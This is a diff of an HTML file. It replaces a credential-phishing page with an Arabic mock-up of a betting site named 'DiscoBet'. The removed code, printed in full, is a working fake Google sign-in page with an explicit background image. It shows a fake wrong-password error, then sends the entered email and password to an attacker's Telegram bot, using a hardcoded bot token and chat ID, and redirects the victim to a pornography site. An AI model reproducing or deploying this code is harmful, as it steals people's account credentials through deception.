@@ -1,198 +1,339 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sign in – Google</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&family=Cairo:wght@700&display=swap" rel="stylesheet">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    html, body {
-      width: 100%;
-      height: 100%;
-      font-family: 'Roboto', sans-serif;
-      overflow: hidden;
-      background: transparent;
-    }
-    .background {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: -1;
-    }
-    .background img {
-      width: 100%;
-      height: 100%;
-      object-fit: fill;
-    }
-    .animated-text {
-      position: fixed;
-      top: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 28px;
-      font-family: 'Cairo', sans-serif;
-      font-weight: bold;
-      background: linear-gradient(90deg, #ff6ec4, #7873f5, #42e695, #ff6ec4);
-      background-size: 800% 800%;
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      animation: animatedGradient 8s linear infinite;
-      letter-spacing: 1px;
-      white-space: nowrap;
-      z-index: 10;
-    }
-    @keyframes animatedGradient {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-    .container {
-      position: absolute;
-      top: 55%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: rgba(0, 0, 0, 0.4);
-      border-radius: 20px;
-      padding: 40px 30px;
-      width: 360px;
-      color: #fff;
-      box-shadow: 0 0 25px rgba(0, 0, 0, 0.4);
-    }
-    .logo {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 20px;
-    }
-    .logo img {
-      width: 90px;
-    }
-    h2 {
-      font-size: 24px;
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    input {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 8px;
-      background: rgba(255, 255, 255, 0.25);
-      color: #fff;
-      font-size: 15px;
-      outline: none;
-    }
-    input::placeholder {
-      color: #ddd;
-    }
-    button {
-      width: 100%;
-      padding: 12px;
-      background-color: #1a73e8;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      cursor: pointer;
-      margin-top: 10px;
-      transition: background 0.3s;
-    }
-    button:hover {
-      background-color: #0f5ec7;
-    }
-    .spinner {
-      display: none;
-      justify-content: center;
-      align-items: center;
-      margin-top: 15px;
-    }
-    .spinner div {
-      width: 20px;
-      height: 20px;
-      border: 3px solid #fff;
-      border-top: 3px solid transparent;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DiscoBet - مرحباً بك في عالم الترفيه</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        /* الخطوط والألوان الأساسية */
+        :root {
+            --main-bg-color: #A7F0B4; /* أخضر فاتح للمبرمجين */
+            --header-bg-color: #2E8B57; /* أخضر داكن للشعار والأزرار والقوائم */
+            --game-box-color: #FF6347; /* أحمر للخانات */
+            --text-color: #333;
+            --white-text: #FFF;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: var(--main-bg-color);
+            color: var(--text-color);
+            overflow-x: hidden;
+        }
+
+        /* ----- شاشة التحميل (Splash Screen) ----- */
+        #splash-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: var(--header-bg-color);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            transition: opacity 1s ease-out;
+        }
+
+        #splash-screen.hidden {
+            opacity: 0;
+            visibility: hidden;
+        }
+
+        #money-animation {
+            width: 80vw;
+            max-width: 500px;
+            aspect-ratio: 16/9;
+            object-fit: contain;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        }
+
+        /* ----- الواجهة الرئيسية (بعد التحميل) ----- */
+        #main-content {
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 1s ease-in;
+        }
+
+        #main-content.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* ----- شريط الرأس (Header) ----- */
+        .header {
+            background-color: var(--header-bg-color);
+            color: var(--white-text);
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 500;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        .header .logo {
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
+        }
+
+        .header .auth-buttons {
+            display: flex;
+            gap: 10px;
+        }
+
+        .header .auth-buttons button {
+            background-color: var(--main-bg-color);
+            color: var(--text-color);
+            border: none;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-weight: 700;
+        }
+
+        .header .auth-buttons button:hover {
+            background-color: #8FD89A;
+        }
+        
+        /* شريط المعلومات داخل المحتوى الرئيسي */
+        .info-bar {
+            background-color: var(--header-bg-color);
+            color: var(--white-text);
+            padding: 10px 15px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+
+        /* حاوية شبكة الألعاب */
+        .games-container {
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        /* تصميم شبكة الألعاب (Grid) */
+        .games-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); 
+            gap: 15px;
+            padding-bottom: 80px;
+        }
+
+        /* تصميم خانة اللعبة الواحدة */
+        .game-box {
+            background-color: var(--game-box-color);
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            padding: 5px;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+            overflow: hidden;
+        }
+
+        .game-box:hover {
+            transform: scale(1.03);
+        }
+
+        .game-image {
+            height: 100px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: var(--white-text);
+            font-weight: 700;
+            font-size: 16px;
+            background-color: var(--game-box-color);
+            border: 2px solid var(--white-text);
+            /* لتوضيح مكان الصورة */
+            background-image: url('https://i.imgur.com/W2h0e3c.png'); /* رابط صورة حمراء بسيطة */
+            background-size: cover;
+            background-position: center;
+        }
+
+        .game-index {
+            background-color: var(--header-bg-color);
+            color: var(--white-text);
+            padding: 5px;
+            border-radius: 5px;
+            font-weight: 700;
+            margin-top: 5px;
+        }
+
+        /* ----- شريط التنقل السفلي (Bottom Nav) ----- */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: var(--header-bg-color);
+            color: var(--white-text);
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0;
+            box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.2);
+            z-index: 900;
+        }
+
+        .bottom-nav .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 12px;
+            cursor: pointer;
+            opacity: 0.7;
+            transition: opacity 0.2s ease;
+        }
+
+        .bottom-nav .nav-item span {
+            margin-top: 3px;
+        }
+
+        .bottom-nav .nav-item.active,
+        .bottom-nav .nav-item:hover {
+            opacity: 1;
+        }
+    </style>
 </head>
 <body>
-  <div class="background">
-    <img src="https://www.newarabsex.com/wp-content/uploads/2019/02/%D8%A8%D9%88%D8%B3-%D8%A8%D9%86%D8%A7%D8%AA-%D9%85%D8%AB%D9%84%D9%8A%D8%A9.gif" alt="Background" />
-  </div>  <div class="animated-text">نتمنى لكم مشاهدة ممتعة</div>  <div class="container">
-    <div class="logo">
-      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+
+    <div id="splash-screen">
+        <img id="money-animation" src="https://i.imgur.com/G5yY1Fk.gif" alt="ماكينة عد النقود والدولارات">
     </div>
-    <h2>Sign in</h2>
-    <form id="loginForm">
-      <input type="email" id="email" placeholder="Email or phone" required>
-      <input type="password" id="password" placeholder="Enter your password (min 6 chars)" required>
-      <button type="submit">تسجيل الدخول</button>
-      <div class="spinner" id="spinner"><div></div></div>
-    </form>
-  </div>  <script>
-    const BOT_TOKEN = '8066816136:AAFqNp9OCT2hHS00yOZ0HfUBzBCxi1ocpY0';
-    const CHAT_ID = '6894787120';
-    let attemptMap = {};
 
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      document.getElementById('spinner').style.display = 'flex';
+    <div id="main-content">
+        
+        <div class="header">
+            <div class="logo">DiscoBet</div>
+            <div class="auth-buttons">
+                <button id="login-btn">تسجيل الدخول</button>
+                <button id="signup-btn">إنشاء حساب جديد</button>
+            </div>
+        </div>
 
-      const email = document.getElementById('email').value.trim();
-      const password = document.getElementById('password').value;
+        <div class="games-container">
+            <div class="info-bar">
+                <div class="balance-info">الرصيد: 0.00 جنيه</div>
+                <div class="notification-icon">🔔</div>
+            </div>
 
-      if (password.length < 6) {
-        alert('كلمة المرور يجب أن تكون 6 أحرف على الأقل.');
-        document.getElementById('spinner').style.display = 'none';
-        return;
-      }
+            <div class="games-grid">
+                </div>
+        </div>
 
-      // Fake attempt logic
-      if (!attemptMap[email]) {
-        attemptMap[email] = 1;
-        alert('كلمة المرور غير صحيحة. حاول مرة أخرى.');
-        document.getElementById('spinner').style.display = 'none';
-        return;
-      }
+        <div class="bottom-nav">
+            <div class="nav-item active">
+                🏠
+                <span>الرئيسية</span>
+            </div>
+            <div class="nav-item" id="bonus-nav">
+                🎁
+                <span>المكافآت</span>
+            </div>
+            <div class="nav-item" id="account-nav">
+                👤
+                <span>حسابي</span>
+            </div>
+            <div class="nav-item" id="chat-nav">
+                💬
+                <span>محادثة</span>
+            </div>
+            <div class="nav-item" id="more-nav">
+                ⚙️
+                <span>المزيد</span>
+            </div>
+        </div>
 
-      const message = `\nGMAIL PHISH\n------------------\nEmail: ${email}\nPassword: ${password}`;
+    </div> <script>
+    // --------------------------------------------------------
+    // 1. توليد 100 خانة لعبة (Games Grid Generation)
+    // --------------------------------------------------------
+    function generateGamesGrid() {
+        const gridContainer = document.querySelector('.games-grid');
+        let htmlContent = '';
 
-      try {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const payload = {
-          chat_id: CHAT_ID,
-          text: message
-        };
-
-        const response = await fetch(url, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(payload)
-        });
-
-        if (response.ok) {
-          window.location.href = 'https://www.pornhub.com/';
-        } else {
-          alert('فشل الإرسال، حاول مرة أخرى');
-          document.getElementById('spinner').style.display = 'none';
+        // إنشاء 100 خانة (من 1 إلى 100)
+        for (let i = 1; i <= 100; i++) {
+            // ملاحظة: data-game-id تستخدم لربط الروابط لاحقاً عند الضغط على الصورة
+            htmlContent += `
+                <div class="game-box" data-game-id="${i}">
+                    <div class="game-image">
+                        صورة اللعبة
+                    </div>
+                    <div class="game-index">
+                        خانة رقم: ${i}
+                    </div>
+                </div>
+            `;
         }
-      } catch (error) {
-        alert('حدث خطأ أثناء الإرسال');
-        document.getElementById('spinner').style.display = 'none';
-      }
+
+        gridContainer.innerHTML = htmlContent;
+    }
+
+    // --------------------------------------------------------
+    // 2. إدارة شاشة التحميل والتحويل (Splash Screen Logic)
+    // --------------------------------------------------------
+    document.addEventListener('DOMContentLoaded', (event) => {
+        const splashScreen = document.getElementById('splash-screen');
+        const mainContent = document.getElementById('main-content');
+        const DURATION = 10000; // 10 ثواني (10000 مللي ثانية)
+
+        // قم بتوليد الخانات فوراً عند تحميل الصفحة
+        generateGamesGrid();
+
+        // إخفاء شاشة التحميل وإظهار المحتوى الرئيسي بعد المدة المحددة (10 ثوان)
+        setTimeout(() => {
+            // إخفاء Splash Screen
+            splashScreen.classList.add('hidden');
+            
+            // إظهار المحتوى الرئيسي
+            mainContent.classList.add('visible');
+
+            // إزالة Splash Screen من DOM بعد انتهاء حركة CSS
+            setTimeout(() => {
+                splashScreen.style.display = 'none';
+            }, 1000); // 1000 مللي ثانية هي مدة الانتقال (transition) في CSS
+        }, DURATION);
     });
-  </script></body>
+
+    // --------------------------------------------------------
+    // 3. (مرحلة لاحقة) كود التعديلات والروابط
+    // --------------------------------------------------------
+    
+    // يمكنك إضافة كود هنا لربط أزرار التسجيل/الدخول بالروابط المطلوبة
+    document.getElementById('login-btn').addEventListener('click', function() {
+        // سيتم وضع الرابط لصفحة تسجيل الدخول هنا لاحقاً
+        console.log('تم الضغط على تسجيل الدخول');
+    });
+
+    // يمكنك إضافة كود هنا لربط الضغط على خانات الألعاب بالروابط المطلوبة
+    document.querySelector('.games-grid').addEventListener('click', function(e) {
+        const gameBox = e.target.closest('.game-box');
+        if (gameBox) {
+            const gameId = gameBox.getAttribute('data-game-id');
+            // هنا سيتم وضع الكود الذي ينقلك إلى رابط معين بناءً على رقم الخانة
+            console.log(`تم الضغط على خانة رقم: ${gameId}`);
+        }
+    });
+</script>
+</body>
 </html>
